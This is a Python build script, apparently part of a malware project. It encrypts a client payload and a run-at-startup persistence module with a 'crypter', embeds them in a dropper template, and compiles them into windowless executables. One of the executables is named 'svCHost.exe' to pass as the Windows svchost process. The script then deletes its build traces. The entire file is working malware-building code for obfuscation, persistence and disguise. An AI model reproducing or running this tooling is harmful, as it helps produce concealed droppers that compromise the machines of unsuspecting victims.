import os
import shutil
os.chdir("crypter")
os.system("python crypter.py ..\\Run_at_Startup\\client_payload.py")
payload = open('encrpted_payload.txt','r').read()
os.remove('encrpted_payload.txt')
os.system("python crypter.py ..\\Run_at_Startup\\run_at_startup.py")
copy_payload = open('encrpted_payload.txt','r').read()
os.remove('encrpted_payload.txt')

f = open('..\\dropper\\dropper.py','r')
code = f.readlines()
f.close()
os.chdir("..\dropper")
fp = open('svCHost.py','w')
for line in code:
    if('data =b\'' in line):
        fp.writelines('data =b\''+ payload+'\''+'\n')
    else:
        fp.writelines(line)
fp.close()
fp = open('copy_.py','w')
for line in code:
    if('data =b\'' in line):
        fp.writelines('data =b\''+ copy_payload+'\''+'\n')
    else:
        fp.writelines(line)
fp.close()
os.system('pyinstaller --noconfirm --onefile --windowed "{0}\copy_.py"'.format(os.getcwd()))
os.system('pyinstaller --noconfirm --onefile --windowed "{0}\svCHost.py"'.format(os.getcwd()))
os.system('move dist\copy_.exe ..\copy_.exe')
os.system('move dist\svCHost.exe ..\svCHost.exe')
shutil.rmtree('dist')
shutil.rmtree('build')
os.remove('copy_.spec')
os.remove('svCHost.spec')
os.remove('copy_.py')
os.remove('svCHost.py')              
